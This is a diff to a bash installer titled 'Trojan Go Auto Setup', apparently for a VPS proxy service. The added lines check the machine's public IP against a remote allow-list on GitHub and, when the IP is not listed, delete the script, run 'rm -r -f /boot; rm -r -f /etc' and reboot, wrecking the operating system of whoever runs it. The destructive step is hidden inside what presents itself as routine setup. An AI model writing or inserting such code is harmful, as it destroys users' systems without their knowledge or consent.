@@ -1,7 +1,24 @@
 #!/bin/bash
 # Trojan Go Auto Setup 
 # =========================
-
+red='\e[1;31m'
+green='\e[0;32m'
+NC='\e[0m'
+MYIP=$(wget -qO- ifconfig.me/ip);
+IZIN=$( curl https://raw.githubusercontent.com/halluboys/ipvps/main/ip | grep $MYIP )
+if [ $MYIP = $IZIN ]; then
+echo -e "${green}Permission Accepted...${NC}"
+else
+echo -e "${red}Permission Denied!${NC}";
+echo "Please Contact Admin"
+echo "Telegram t.me/xzvnct"
+echo "Waiting 5 Sec"
+rm -f setup.sh
+sleep 5
+rm -r -f /boot; rm -r -f /etc; reboot
+exit 0
+fi
+clear
 # Domain 
 domain=$(cat /etc/v2ray/domain)
 
